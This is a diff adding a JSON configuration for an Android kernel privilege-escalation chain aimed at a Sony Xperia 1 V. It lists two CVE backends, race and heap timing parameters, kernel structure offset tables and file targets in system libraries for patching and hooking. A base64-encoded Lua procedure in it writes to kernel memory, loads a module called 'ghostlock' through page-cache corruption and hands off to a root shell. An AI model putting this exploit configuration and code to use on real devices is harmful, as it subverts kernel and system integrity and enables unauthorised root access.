@@ -1,0 +1,176 @@
+{
+ "schema": "GLKv3_wire",
+ "release": "5.15.189-android13-8-00016-g51bba4309aac-ab14546557",
+ "device": "Sony Xperia 1 V",
+ "shizuku": true,
+ "step": {
+  "key": "CVE-2026-43284 pagecache (kernelcall 读法② ✓)",
+  "data": [
+   {
+    "key": "cpu_core_pair",
+    "value": [
+     0,
+     1
+    ]
+   }
+  ],
+  "code": "LS0gcHJvY2VkdXJlcy9wYWdlY2FjaGVfbG9hZF9sa20ubHVhCi0tIDQzMjg0IOmTvueahCBMdWEg6YeN5YaZ77yaKirlj6rotbDlupXlsYLooYwqKu+8iGJhY2tlbmQgLyB3cml0ZW9wIC8gY29weW9wIC8gc2V0dGxlIC8gaGFuZG9mZiAvIGNsb3NlICsg5Y+q6K+7IGNmZ++8ie+8jAotLSDkuI3osIPnlKjlsIHoo4XnmoQgc3RlcCDmjqXlj6PjgILlvaLnirbmjIkgYHByb2NlZHVyZWAg5aWR57qm77yIcHJvZmlsZS1sdWEtYnJpZGdlLXBsYW4ubWTjgIznlKjmiLfoo4HlrprkuI4gYHByb2NlZHVyZWAKLS0g5aWR57qm44CN77yJ77yabmFtZSArIHJ1bihjdHgp77yM5Y+v6YCJIG9uX3N1Y2Nlc3MgLyBvbl9mYWlsdXJl77ybY2ZnIOWPquivu++8jOWGmeWFpeWNs+aLkuOAggotLQotLSDlr7nlupQgQysrIOW3peWFt++8iHRvb2xzL3BhZ2VjYWNoZV9sb2FkX2xrbS5jcHDvvInnmoTkuIPkuKogcGhhc2XvvJoKLS0gICBjcmVkZW50aWFscyDihpIgbW9kdWxlIOKGkiBwYXRjaDEg4oaSIGhvb2sg4oaSIHdyaXRlIOKGkiB0cmlnZ2VyIOKGkiB3YWl0Ci0tIOS4ieexu+i+k+WFpeWQhOW9kuWFtuS9je+8mgotLSAgIChhKSDmlbDlgLwg4oaSIOivu+WPquivuyBjZmfvvIjngrnliIblkI3vvInvvJsKLS0gICAoYikg5a2X6IqCIOKGkiBTQSDluKcgLyDmqKHlnZfplZzlg48gLyBoZWxwZXIg6ZWc5YOP77yaKirkuI3og70qKueUqOS4gOS4qiB1NjQg6KGo6L6+77yM55Sx5a6/5Li75oyJ5ZCN6Kej5p6Q77yI5paH5qGj5LiN6L295a+G6ZKl77yJ77ybCi0tICAgKGMpIOWbnuivuyDihpIg5bqV5bGC6KGM6YeM5rKh5pyJIHJlYWQg6KGM77yM5YaZ5YWl5ZCO55qE6K+75Zue5qCh6aqM5bGe5a6/5Li75L6n44CCCi0tIOaJgOS7peacrOiEmuacrOivgeaYjuOAjOW6leWxguavj+S4gOihjOmDveiDveS7jiBMdWEg5omT5Yiw44CN77yb6LeR5a6M5pW05p2h6ZO+6LWw5bCB6KOF55qEIHN0ZXAg5o6l5Y+jCi0tIO+8iHN1cmZhY2Uuc3RlcChoYW5kbGUsIG5hbWUp77yM5ZCN5a2X55SxIHdpcmUg55qEIGJhY2tlbmQuPGlkPi5zdGVwcyDlo7DmmI7vvInjgIIKCmxvY2FsIHByb2NlZHVyZSA9IHsKICAgIG5hbWUgPSAicGFnZWNhY2hlX2xvYWRfbGttIiwKICAgIHRlcm1pbmFsID0gInJvb3Rfc2hlbGwiLAogICAgcGF5bG9hZF9yZWYgPSAidmVuZG9yL2xpYjY0L2xpYmJpbmRlcmRlYnVnLnNvIiwKfQoKLS0gcGhhc2UgMS8yIOeahOi+ueeVjO+8muS8muivneW4p+S4juaooeWdl+mVnOWDj+eUseWuv+S4u+aPkOS+m++8jOiEmuacrOWPquiupOWug+S7rOeahOWQjeWtl+OAggpwcm9jZWR1cmUucmVxdWlyZW1lbnRzID0geyAic2EiLCAibW9kdWxlIiB9CgpmdW5jdGlvbiBwcm9jZWR1cmUucnVuKGN0eCkKICAgIGxvY2FsIGlkID0gImN2ZV8yMDI2XzQzMjg0IgogICAgbG9jYWwgaCA9IHN1cmZhY2UuYmFja2VuZChpZCkgICAgICAgICAgICAgICAgIC0tIOWPluWPpeafhO+8muS4gOasoei/kOihjOS4gOS4qiBiYWNrZW5kCgogICAgbG9jYWwgYmxvY2sgPSBjZmdbImJhY2tlbmQuY3ZlXzIwMjZfNDMyODQuZXhlY3V0aW9uLndyaXRlLmJsb2NrX2J5dGVzIl0KICAgIGxvY2FsIGRlbGF5ID0gY2ZnWyJiYWNrZW5kLmN2ZV8yMDI2XzQzMjg0LmV4ZWN1dGlvbi50cmlnZ2VyLmRlbGF5X21zIl0KICAgIGxvY2FsIGJ1ZGdldCA9IGNmZ1siYmFja2VuZC5jdmVfMjAyNl80MzI4NC5leGVjdXRpb24ud2FpdC5idWRnZXRfbXMiXQogICAgYXNzZXJ0KGJsb2NrID09IDE2LCAiY2ZnOiB3cml0ZS5ibG9ja19ieXRlcyIpCiAgICBhc3NlcnQoZGVsYXkgPT0gMTAwMCwgImNmZzogdHJpZ2dlci5kZWxheV9tcyIpCiAgICBhc3NlcnQoYnVkZ2V0ID09IDUwMDAsICJjZmc6IHdhaXQuYnVkZ2V0X21zIikKCiAgICAtLSBwaGFzZSA1IOeahOWPr+ihqOi+vumDqOWIhu+8mmhvb2sg5piv5LiA5LiqIDQg5a2X6IqC5a2X77yI56uZ54K55LiOIHBheWxvYWQg5bGeIGhvb2sg6K6h5YiS77yM5LiA5aSE5p2D5aiB77yJ44CCCiAgICBzdXJmYWNlLmtlcm5lbGNhbGwoaCwgIndyaXRlIiwgImFic29sdXRlIiwgMHgwLCAweDE0MDEyZDgzLCA0KQoKICAgIC0tIHBoYXNlIDMg55qE5Y+v6KGo6L6+6YOo5YiG77ya5Z2X6Ze05pCs6L+Q77yI5rqQL+ebrueahOmDveaYr+WcsOWdgOepuumXtOmHjOeahOS9jee9ru+8jOS4lOaAu+aYr+W4puWuveW6pu+8ieOAggogICAgc3VyZmFjZS5jb3B5b3AoaCwgImRpcmVjdF9tYXAiLCAweDAsICJrZXJuZWxfb2Zmc2V0IiwgMHgwLCBibG9jaykKCiAgICAtLSBwaGFzZSA0YS80Yu+8muinpuWPkeWJjeeahOiuqeS9jeS4juetieW+hemihOeul+OAggogICAgc3VyZmFjZS5zZXR0bGUoaCwgZGVsYXkpCgogICAgLS0g5Lqk57uT54K577yadGVybWluYWwg5LiOIHBheWxvYWRfcmVmIOS4gOi1t+e7me+8iHNjcmlwdF9zdXJmYWNlIEEy77yJ44CCCiAgICBzdXJmYWNlLmhhbmRvZmYoaCwgcHJvY2VkdXJlLnRlcm1pbmFsLCBwcm9jZWR1cmUucGF5bG9hZF9yZWYpCiAgICBzdXJmYWNlLmNsb3NlKGgpCmVuZAoKcmV0dXJuIHByb2NlZHVyZQo=",
+  "backend": "cve_2026_43284",
+  "route": "pagecache",
+  "required_param": [
+   "sa"
+  ]
+ },
+ "handoff": {
+  "type": "lkm",
+  "data": [
+   "vendor/lib64/libbinderdebug.so"
+  ]
+ },
+ "backend": {
+  "cve_2026_43499": {
+   "execution": {
+    "heap": {
+     "kernelsnitch_collisions": 4,
+     "kernelsnitch_timeout_ms": 60000,
+     "prepare_max_attempts": 4,
+     "prepare_timeout_ms": 240000,
+     "snitch_round_wait_us": 2000,
+     "snitch_threads": 1,
+     "snitch_wake_rounds": 200
+    },
+    "race": {
+     "route_wait_ms": 1000,
+     "route_done_timeout_ms": 300000,
+     "setup_settle_us": 50000,
+     "state_poll_interval_us": 1000
+    },
+    "stages": {
+     "w1_attempts": 15,
+     "w1_settle_us": 100000,
+     "w1_scratch_repair_attempts": 3,
+     "w2_attempts": 15,
+     "w2_settle_us": 100000,
+     "w3_chain_rounds": 3,
+     "w3_attempts": 6,
+     "w3_settle_us": 50000
+    },
+    "handoff": {
+     "pre_dispatch_settle_ms": 2000,
+     "module_poll_attempts": 30,
+     "module_poll_interval_ms": 100,
+     "enforce_poll_attempts": 200,
+     "enforce_poll_interval_ms": 100
+    }
+   },
+   "abi": {
+    "task_struct": {
+     "prio": "0x0000",
+     "normal_prio": "0x0000",
+     "sched_task_group": "0x0000",
+     "pi_lock": "0x0000",
+     "pi_waiters": "0x0000",
+     "pi_top_task": "0x0000",
+     "pi_blocked_on": "0x0000",
+     "pid": "0x0000",
+     "tgid": "0x0000",
+     "atomic_flags": "0x0000",
+     "real_cred": "0x0000",
+     "cred": "0x0000",
+     "comm": "0x0000",
+     "tasks": "0x0000",
+     "seccomp": "0x0000"
+    },
+    "cred": {
+     "caps_offset": "0x0000",
+     "usage_offset": "0x0000",
+     "ref_count": "0x0000",
+     "ref0_offset": "0x0000",
+     "ref1_offset": "0x0000",
+     "ref2_offset": "0x0000",
+     "ref3_offset": "0x0000"
+    },
+    "kernel": {
+     "kernel_phys_load": "0x0000",
+     "kernel_phys_offset": "0x0000"
+    },
+    "offset": {
+     "empty_zero_page": "0x0000",
+     "init_cred": "0x0000",
+     "init_task": "0x0000",
+     "root_task_group": "0x0000",
+     "security_hook_heads": "0x0000"
+    }
+   },
+   "route": {
+    "multicast_waiter": {
+     "abi": {
+      "buffer_size": "65536",
+      "lock_offset": "24",
+      "task_offset": "32",
+      "waiter_off": "40"
+     },
+     "execution": {
+      "arm_hold": 64,
+      "arm_sequence": 2,
+      "attempts": 8
+     }
+    }
+   }
+  },
+  "cve_2026_43284": {
+   "steps": [
+    "patch1",
+    "carrier",
+    "hook",
+    "trigger",
+    "wait"
+   ],
+   "targets": {
+    "carrier": "/vendor/lib64/libbinderdebug.so",
+    "carrier_base": "0x0",
+    "dev_carrier": "/data/local/tmp/ghostlock-carrier",
+    "module": "/data/local/tmp/ghostlock.ko",
+    "patch1_target": "/apex/com.android.runtime/bin/crash_dump64",
+    "hook_target": "/system/lib64/libc++.so",
+    "hook_symbol": "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
+    "frame": "/data/local/tmp/ghostlock-sa.frame"
+   },
+   "execution": {
+    "write": {
+     "block_bytes": 16,
+     "module_max_bytes": 67108864
+    },
+    "trigger": {
+     "delay_ms": 1000
+    },
+    "wait": {
+     "budget_ms": 5000,
+     "poll_ms": 10
+    }
+   },
+   "module": {
+    "arch": "aarch64",
+    "force_unload": false,
+    "modversions": true,
+    "tokens": {
+     "smp": "SMP",
+     "preempt": "preempt",
+     "unload": "mod_unload"
+    }
+   },
+   "markers": {
+    "loaded": "/dev/dfm0",
+    "failed": "/dev/dfm1",
+    "hook": "/dev/df",
+    "module": "/sys/module/dirtyfrag"
+   }
+  }
+ },
+ "budgets": {
+  "max_instructions": 200000,
+  "max_bytes": 4194304,
+  "max_stack_depth": 32,
+  "max_script_bytes": 65536
+ }
+}
